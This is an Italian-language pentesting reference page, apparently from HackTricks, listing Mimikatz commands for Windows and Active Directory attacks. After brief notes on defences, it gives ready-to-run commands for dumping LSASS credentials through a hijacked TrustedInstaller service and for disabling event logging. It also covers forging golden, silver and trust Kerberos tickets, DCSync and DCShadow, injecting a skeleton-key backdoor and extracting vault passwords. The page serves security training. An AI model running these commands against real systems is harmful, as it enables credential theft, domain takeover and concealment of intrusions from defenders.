# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Questa pagina si basa su una di [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Controlla l'originale per ulteriori informazioni!

## LM e Clear-Text in memoria

A partire da Windows 8.1 e Windows Server 2012 R2, sono state implementate misure significative per proteggere contro il furto di credenziali:

- **LM hashes e password in chiaro** non sono più memorizzati in memoria per migliorare la sicurezza. Una specifica impostazione del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve essere configurata con un valore DWORD di `0` per disabilitare l'autenticazione Digest, assicurando che le password "in chiaro" non siano memorizzate nella cache in LSASS.

- **LSA Protection** è stata introdotta per proteggere il processo dell'Autorità di Sicurezza Locale (LSA) dalla lettura non autorizzata della memoria e dall'iniezione di codice. Questo viene realizzato contrassegnando LSASS come processo protetto. L'attivazione della protezione LSA comporta:
1. Modificare il registro in _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ impostando `RunAsPPL` su `dword:00000001`.
2. Implementare un Oggetto Criteri di Gruppo (GPO) che applica questa modifica del registro sui dispositivi gestiti.

Nonostante queste protezioni, strumenti come Mimikatz possono eludere la protezione LSA utilizzando driver specifici, anche se tali azioni sono probabilmente registrate nei log degli eventi.

### Contro il Ritiro di SeDebugPrivilege

Gli amministratori di solito hanno SeDebugPrivilege, che consente loro di eseguire il debug dei programmi. Questo privilegio può essere limitato per prevenire dump di memoria non autorizzati, una tecnica comune utilizzata dagli attaccanti per estrarre credenziali dalla memoria. Tuttavia, anche con questo privilegio rimosso, l'account TrustedInstaller può ancora eseguire dump di memoria utilizzando una configurazione di servizio personalizzata:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Questo consente di eseguire il dump della memoria di `lsass.exe` in un file, che può poi essere analizzato su un altro sistema per estrarre le credenziali:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opzioni di Mimikatz

La manomissione dei registri eventi in Mimikatz comporta due azioni principali: cancellare i registri eventi e patchare il servizio Event per prevenire la registrazione di nuovi eventi. Di seguito sono riportati i comandi per eseguire queste azioni:

#### Cancellazione dei Registri Eventi

- **Comando**: Questa azione è mirata a eliminare i registri eventi, rendendo più difficile tracciare attività dannose.
- Mimikatz non fornisce un comando diretto nella sua documentazione standard per cancellare i registri eventi direttamente tramite la sua riga di comando. Tuttavia, la manipolazione dei registri eventi comporta tipicamente l'uso di strumenti di sistema o script al di fuori di Mimikatz per cancellare registri specifici (ad esempio, utilizzando PowerShell o Windows Event Viewer).

#### Funzione Sperimentale: Patchare il Servizio Event

- **Comando**: `event::drop`
- Questo comando sperimentale è progettato per modificare il comportamento del Servizio di Registrazione Eventi, impedendo efficacemente la registrazione di nuovi eventi.
- Esempio: `mimikatz "privilege::debug" "event::drop" exit`

- Il comando `privilege::debug` garantisce che Mimikatz operi con i privilegi necessari per modificare i servizi di sistema.
- Il comando `event::drop` quindi patcha il servizio di registrazione eventi.

### Attacchi ai Ticket Kerberos

### Creazione di un Golden Ticket

Un Golden Ticket consente l'accesso per impersonificazione a livello di dominio. Comando chiave e parametri:

- Comando: `kerberos::golden`
- Parametri:
- `/domain`: Il nome del dominio.
- `/sid`: L'Identificatore di Sicurezza (SID) del dominio.
- `/user`: Il nome utente da impersonare.
- `/krbtgt`: L'hash NTLM dell'account di servizio KDC del dominio.
- `/ptt`: Inietta direttamente il ticket in memoria.
- `/ticket`: Salva il ticket per un uso successivo.

Esempio:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creazione di Silver Ticket

I Silver Ticket concedono accesso a servizi specifici. Comando chiave e parametri:

- Comando: Simile al Golden Ticket ma mira a servizi specifici.
- Parametri:
- `/service`: Il servizio da mirare (ad es., cifs, http).
- Altri parametri simili al Golden Ticket.

Esempio:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creazione del Trust Ticket

I Trust Ticket vengono utilizzati per accedere alle risorse tra domini sfruttando le relazioni di fiducia. Comando e parametri chiave:

- Comando: Simile al Golden Ticket ma per le relazioni di fiducia.
- Parametri:
- `/target`: Il FQDN del dominio di destinazione.
- `/rc4`: L'hash NTLM per l'account di fiducia.

Esempio:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandi Aggiuntivi di Kerberos

- **Elenco Ticket**:

- Comando: `kerberos::list`
- Elenca tutti i ticket Kerberos per la sessione utente corrente.

- **Passa la Cache**:

- Comando: `kerberos::ptc`
- Inietta ticket Kerberos da file di cache.
- Esempio: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Passa il Ticket**:

- Comando: `kerberos::ptt`
- Consente di utilizzare un ticket Kerberos in un'altra sessione.
- Esempio: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Pulisci Ticket**:
- Comando: `kerberos::purge`
- Cancella tutti i ticket Kerberos dalla sessione.
- Utile prima di utilizzare comandi di manipolazione dei ticket per evitare conflitti.

### Manomissione di Active Directory

- **DCShadow**: Fai agire temporaneamente una macchina come un DC per la manipolazione degli oggetti AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita un DC per richiedere dati sulla password.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Accesso alle Credenziali

- **LSADUMP::LSA**: Estrai credenziali da LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Imita un DC utilizzando i dati sulla password di un account computer.

- _Nessun comando specifico fornito per NetSync nel contesto originale._

- **LSADUMP::SAM**: Accedi al database SAM locale.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decripta segreti memorizzati nel registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Imposta un nuovo hash NTLM per un utente.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera informazioni di autenticazione di fiducia.
- `mimikatz "lsadump::trust" exit`

### Varie

- **MISC::Skeleton**: Inietta un backdoor in LSASS su un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalation dei Privilegi

- **PRIVILEGE::Backup**: Acquisisci diritti di backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Ottieni privilegi di debug.
- `mimikatz "privilege::debug" exit`

### Dumping delle Credenziali

- **SEKURLSA::LogonPasswords**: Mostra le credenziali per gli utenti connessi.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Estrai ticket Kerberos dalla memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipolazione di Sid e Token

- **SID::add/modify**: Cambia SID e SIDHistory.

- Aggiungi: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modifica: _Nessun comando specifico per modificare nel contesto originale._

- **TOKEN::Elevate**: Imita i token.
- `mimikatz "token::elevate /domainadmin" exit`

### Servizi Terminal

- **TS::MultiRDP**: Consenti sessioni RDP multiple.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Elenca sessioni TS/RDP.
- _Nessun comando specifico fornito per TS::Sessions nel contesto originale._

### Vault

- Estrai password da Windows Vault.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
